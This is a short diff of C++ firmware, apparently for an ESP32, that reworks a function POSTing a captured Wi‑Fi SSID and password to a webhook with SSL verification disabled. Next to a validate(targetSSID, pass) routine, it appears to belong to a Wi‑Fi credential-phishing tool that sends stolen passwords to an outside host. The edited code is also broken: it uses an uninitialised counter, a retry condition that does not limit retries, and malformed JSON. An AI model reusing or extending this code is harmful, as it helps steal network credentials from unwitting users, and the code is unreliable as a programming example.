@@ -110,25 +110,25 @@ void validate(const String &targetSSID, const String &pass){
 }
 
 void sendWebhook(const String url, const String ssid, const String pass) {
-  WiFiClientSecure *client = new WiFiClientSecure; HTTPClient https;
+  WiFiClientSecure client; HTTPClient https;
   int httpCode = 255;
 
   if (client) {
-    client->setInsecure(); //Disable SSL certificate verification
+    client.setInsecure(); //Disable SSL certificate verification
     
-    if (https.begin(*client, url)){
+    if (https.begin(client, url)){
       https.addHeader("Content-Type", "application/json"); //Set request as JSON
 
-      while (httpCode != 200){ //send post request until http code is 200
+      int i;
+      while (httpCode != 200 || i > 5){ //send post request until http code is 200
         httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}"); //send post request
         esp.printf("Webhook HTTP code %i\n\n", httpCode);
-        delay(500);
+        delay(500); i++;
       }
       
-      if (httpCode == 200) { https.end(); } //ifrequest is send successfully stop the http client
+      if (httpCode == 200 || i > 5) { https.end(); } //ifrequest is send successfully stop the http client
     }
   }
-  delete client; //delete pointer to client
 }
 
 void setup() {
